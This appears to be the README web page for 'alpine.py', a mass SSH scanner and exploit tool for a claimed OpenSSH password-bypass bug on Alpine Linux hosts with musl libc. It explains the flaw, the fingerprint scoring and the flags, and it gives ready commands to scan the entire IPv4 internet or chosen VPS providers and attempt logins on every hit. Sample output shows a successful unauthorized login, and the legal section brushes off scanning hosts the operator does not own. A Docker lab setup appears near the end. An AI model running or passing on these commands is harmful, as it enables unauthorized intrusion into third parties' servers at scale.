<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>alpine.py — CVE-2026-123158 hunter</title>
<style>
  :root {
    --bg: #0b0f12;
    --panel: #10161b;
    --line: #1e2a33;
    --text: #c6d3dc;
    --dim: #7d8f9b;
    --ice: #8ab4d8;
    --green: #6fd39b;
    --red: #e06c75;
    --amber: #d9a95c;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0; background: var(--bg); color: var(--text);
    font: 16px/1.65 -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
  }
  .wrap { max-width: 920px; margin: 0 auto; padding: 0 24px 96px; }
  header { border-bottom: 1px solid var(--line); padding: 48px 0 28px; }
  h1 {
    font: 600 30px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace;
    color: #fff; margin: 0 0 10px; letter-spacing: -.02em;
  }
  h1::before { content: "$ "; color: var(--green); }
  .tag { color: var(--dim); font-size: 15px; margin: 0; }
  .tag a { color: var(--ice); }
  img.banner {
    width: 100%; display: block; margin: 28px 0 0;
    border: 1px solid var(--line); border-radius: 6px;
  }
  h2 {
    font: 600 13px/1 ui-monospace, Menlo, monospace;
    text-transform: uppercase; letter-spacing: .14em;
    color: var(--ice); margin: 56px 0 16px;
    padding-bottom: 10px; border-bottom: 1px solid var(--line);
  }
  h2::before { content: "# "; color: var(--dim); }
  p { margin: 0 0 16px; }
  ul, ol { margin: 0 0 16px; padding-left: 22px; }
  li { margin-bottom: 6px; }
  li::marker { color: var(--green); }
  a { color: var(--ice); text-decoration: none; border-bottom: 1px dotted #3a4c5a; }
  a:hover { border-bottom-color: var(--ice); }
  code {
    font: 13.5px/1.5 ui-monospace, Menlo, monospace;
    background: #16202a; color: #dfe9f0;
    padding: 2px 6px; border-radius: 4px; border: 1px solid var(--line);
  }
  pre {
    background: var(--panel); border: 1px solid var(--line);
    border-left: 3px solid #2d3f4c; border-radius: 5px;
    padding: 16px 18px; overflow-x: auto; margin: 0 0 18px;
  }
  pre code { background: none; border: 0; padding: 0; color: #cfdbe4; }
  pre.out { border-left-color: var(--green); }
  pre.out .g { color: var(--green); }
  pre.out .r { color: var(--red); }
  pre.out .d { color: var(--dim); }
  table {
    width: 100%; border-collapse: collapse; margin: 0 0 18px;
    font-size: 14.5px;
  }
  th, td { text-align: left; padding: 9px 12px; border-bottom: 1px solid var(--line); vertical-align: top; }
  th {
    font: 600 11.5px/1 ui-monospace, Menlo, monospace;
    text-transform: uppercase; letter-spacing: .1em; color: var(--dim);
  }
  tbody tr:nth-child(odd) { background: #0e1419; }
  td:first-child code { color: var(--ice); }
  .note {
    border-left: 3px solid var(--amber); background: #16130d;
    padding: 14px 18px; border-radius: 0 5px 5px 0; margin: 0 0 18px;
    font-size: 15px;
  }
  .note strong { color: var(--amber); }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 14px; margin-bottom: 18px; }
  .card { background: var(--panel); border: 1px solid var(--line); border-radius: 6px; padding: 16px 18px; }
  .card b { display: block; color: #fff; font: 600 13px/1.4 ui-monospace, Menlo, monospace; margin-bottom: 6px; }
  .card span { color: var(--dim); font-size: 14px; }
  .stat { color: var(--green); font: 600 12px/1 ui-monospace, Menlo, monospace; }
  footer { border-top: 1px solid var(--line); margin-top: 64px; padding-top: 22px; color: var(--dim); font-size: 14px; }
  @media (max-width: 620px) { .wrap { padding: 0 16px 64px; } h1 { font-size: 24px; } }
</style>
</head>
<body>
<div class="wrap">

<header>
  <h1>alpine.py</h1>
  <p class="tag">Mass SSH scanner for Alpine Linux hosts and <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-123158">CVE-2026-123158</a> (<em>sshole</em>) — an OpenSSH password authentication bypass on musl libc without PAM.</p>
  <img class="banner" src="alpine.png" alt="alpine.py">
</header>

<h2>Sample output</h2>
<pre class="out"><code>[FOUND - ALPINE SSH] - ssh://203.0.113.7:2222 - Germany (DE)
[VULN CVE-2026-123158] - ssh://203.0.113.7:2222 - OpenSSH 9.6 - EXPLOITED nobody/257
<span class="d">&gt; Trying bypass....</span>
<span class="d">&gt; ssh nobody@203.0.113.7 -p 2222</span>
<span class="d">&gt; Password : AAAA...AAA (257)</span>
<span class="g">&gt; Successful login as nobody!</span></code></pre>

<h2>The bug</h2>
<p><code>crypt()</code> in musl returns the string <code>*</code> for any password longer than 256 bytes. Accounts with a disabled password store exactly <code>*</code> in <code>/etc/shadow</code>. sshd compares <code>*</code> with <code>*</code> and accepts. Any password between 257 and 1024 bytes logs in.</p>

<p>Requirements, all of them:</p>
<ul>
  <li>musl libc, PAM disabled (Alpine's default)</li>
  <li><code>PasswordAuthentication yes</code></li>
  <li>an account whose shadow field is <code>*</code> — not <code>!</code>, not empty</li>
  <li>another account on the host with a <code>$5$</code> or <code>$6$</code> hash, to borrow a salt from</li>
  <li>OpenSSH below 10.6p2 <strong>and</strong> an unpatched package</li>
</ul>

<div class="note"><strong>Version is not evidence.</strong> Alpine backported the fix to every branch back to 3.16 without changing the version string. The banner cannot tell you whether a host is patched — only the auth attempt can.</div>

<h2>How it works</h2>
<p>Three stages, each gated so the next one only runs when it is worth it:</p>
<ol>
  <li><b>Discovery</b> — random public IPv4, bogons excluded, gated on the SSH ports only. Hosts that answer nowhere are dropped before any real work.</li>
  <li><b>Scan</b> — optional (<code>--portscan</code>), the full port list on hosts that have SSH open.</li>
  <li><b>Verify</b> — full SSH handshake, banner tag check, HASSH+<code>shk</code> fingerprint match, cPanel rejection, then the auth probe.</li>
</ol>

<p>Scoring weights, cumulative, default threshold 45. A fingerprint match is mandatory unless the banner literally says Alpine, or you pass <code>--allow-tagged</code>.</p>

<table>
  <thead><tr><th>Signal</th><th>Weight</th></tr></thead>
  <tbody>
    <tr><td><code>alpine</code> in banner</td><td>110</td></tr>
    <tr><td>Fingerprint in DB</td><td>70</td></tr>
    <tr><td><code>Apache/x (Unix)</code> header</td><td>35</td></tr>
    <tr><td><code>lighttpd</code> header</td><td>18</td></tr>
    <tr><td><code>nginx</code> / bare <code>Apache</code> header</td><td>12</td></tr>
    <tr><td>lean KEX list</td><td>11</td></tr>
    <tr><td><code>ssh-rsa</code> + <code>ssh-ed25519</code> both offered</td><td>11</td></tr>
    <tr><td>OpenSSH banner</td><td>8</td></tr>
  </tbody>
</table>

<h2>Install</h2>
<pre><code>pip install paramiko</code></pre>
<p><code>paramiko</code> is only required for <code>--exploit</code>. Everything else runs on a bare Python 3.9+. Docker is needed once, to build the fingerprint database.</p>

<h2>Seed the fingerprint database</h2>
<p>The DB is empty by default and without it nothing matches. <code>--seed</code> builds it from official Alpine images:</p>
<pre><code>python3 alpine.py --seed
awk '!seen[$1]++' hassh_alpine.txt &gt; /tmp/h &amp;&amp; mv /tmp/h hassh_alpine.txt</code></pre>
<p>Each entry is <code>hassh:shk_md5</code>, where HASSH covers the KEX, cipher, MAC and compression lists and the second component covers host key algorithms.</p>

<h2>Usage</h2>
<pre><code># whole internet, verify and exploit every hit
python3 alpine.py --start-attack --all --verify --cve --exploit -o hits.txt

# cheap VPS providers only, where abandoned Alpine boxes live
python3 alpine.py --start-attack --asn 24940,14061,16276 --verify --cve --exploit -o hits.txt

# your own ranges, full port scan on SSH hosts
python3 alpine.py --start-attack --targets cidrs.txt --portscan --verify -o hits.txt

# single host, verbose
python3 alpine.py --test 203.0.113.7:22</code></pre>
<p><code>--start-attack</code> is required. Without it you get usage only.</p>

<h2>Output</h2>
<p>Findings go to stdout and to <code>-o</code>. The attempt block goes to the terminal only, so files stay clean. <code>--json</code> writes JSONL alongside.</p>

<div class="grid">
  <div class="card"><b>EXPLOITED</b><span class="stat">real finding</span><br><span>Logged in. The only verdict that means anything.</span></div>
  <div class="card"><b>account-has-password</b><span>Vulnerable and password auth is on, but every account carries a hash.</span></div>
  <div class="card"><b>no-password-auth</b><span>Publickey only. Not exploitable. Suppressed by default.</span></div>
  <div class="card"><b>version-only</b><span><code>--exploit</code> not used, banner checked only.</span></div>
</div>

<h2>Flags</h2>
<table>
  <thead><tr><th>Flag</th><th>Default</th><th></th></tr></thead>
  <tbody>
    <tr><td><code>--start-attack</code></td><td></td><td>required to run</td></tr>
    <tr><td><code>--all</code></td><td></td><td>random global IPv4</td></tr>
    <tr><td><code>--asn</code></td><td></td><td>comma-separated ASNs to expand</td></tr>
    <tr><td><code>--targets</code></td><td></td><td>files of IPs/CIDRs</td></tr>
    <tr><td><code>--shodan</code></td><td></td><td>Shodan API key</td></tr>
    <tr><td><code>--verify</code></td><td></td><td>run verification, required for hits</td></tr>
    <tr><td><code>--exploit</code></td><td></td><td>attempt the bypass</td></tr>
    <tr><td><code>--portscan</code></td><td></td><td>full port scan on SSH hosts</td></tr>
    <tr><td><code>--no-gate</code></td><td></td><td>skip discovery, scan every host</td></tr>
    <tr><td><code>--ports</code></td><td><code>top</code></td><td>port list, ranges allowed</td></tr>
    <tr><td><code>--gate-ports</code></td><td><code>22,2222</code></td><td>discovery ports</td></tr>
    <tr><td><code>--cve-user</code></td><td><code>root</code></td><td>primary account, tried at every length</td></tr>
    <tr><td><code>--cve-users</code></td><td>system accounts</td><td>fallback list, one length each</td></tr>
    <tr><td><code>--cve-lengths</code></td><td><code>257,300,512,1024</code></td><td>password lengths</td></tr>
    <tr><td><code>--min-score</code></td><td><code>45</code></td><td>hit threshold</td></tr>
    <tr><td><code>--concurrency</code></td><td><code>800</code></td><td>port workers</td></tr>
    <tr><td><code>--host-workers</code></td><td><code>600</code></td><td>host workers</td></tr>
    <tr><td><code>--rate</code></td><td><code>0</code></td><td>global packets/sec</td></tr>
    <tr><td><code>--timeout</code></td><td><code>3.0</code></td><td>connect timeout</td></tr>
    <tr><td><code>--allow-tagged</code></td><td></td><td>accept Debian/Ubuntu/CentOS lookalikes</td></tr>
    <tr><td><code>--show-rejects</code></td><td></td><td>log every rejection with its reason</td></tr>
    <tr><td><code>--no-geo</code></td><td></td><td>skip GeoIP</td></tr>
    <tr><td><code>--no-color</code></td><td></td><td>plain output</td></tr>
  </tbody>
</table>

<h2>Lab</h2>
<p><a href="https://github.com/leonjza/sshhole-lab">leonjza/sshhole-lab</a>:</p>
<pre><code>docker run -d --rm --name sshhole-lab -p 2222:22 ghcr.io/leonjza/sshhole-lab:latest</code></pre>
<p>The image ships both <code>root</code> and <code>alpine</code> as <code>*</code> and no <code>$6$</code> hash, so the salt borrow never fires. Add one:</p>
<pre><code>HASH=$(openssl passwd -6 rootpw)
docker exec sshhole-lab sed -i "s|^root:.*|root:$HASH:20764:0:99999:7:::|" /etc/shadow
docker exec sshhole-lab pkill -HUP sshd</code></pre>

<h2>Limitations</h2>
<ul>
  <li><strong>Version is not evidence.</strong> Backports keep the old version string. Expect many <code>account-has-password</code> and few <code>EXPLOITED</code>.</li>
  <li><strong>Arch and Gentoo are indistinguishable</strong> from Alpine on a matching version with a plain banner.</li>
  <li><strong><code>!</code> is not <code>*</code>.</strong> A host full of locked accounts is not vulnerable however old its OpenSSH is.</li>
  <li><strong>Hits are point-in-time.</strong> A host that answered during the scan may ban you minutes later. fail2ban is common and <code>--exploit</code> makes it likelier.</li>
  <li><strong>GeoIP</strong> uses the free ip-api batch endpoint, 100 IPs per call, 45 calls/min. Switch to a local MaxMind DB for large runs.</li>
  <li>Scans are unauthenticated TCP plus a KEXINIT exchange, except <code>--exploit</code> which performs logins.</li>
</ul>

<h2>Legal</h2>
<p>Scanning is passive but not silent. On hosts you do not own, keep <code>--rate</code> sane and expect <code>auth.log</code> entries. <code>--exploit</code> writes nothing and changes no state.</p>

<footer>MIT licensed · banner lives at <code>alpine.png</code> next to this file.</footer>

</div>
</body>
</html>
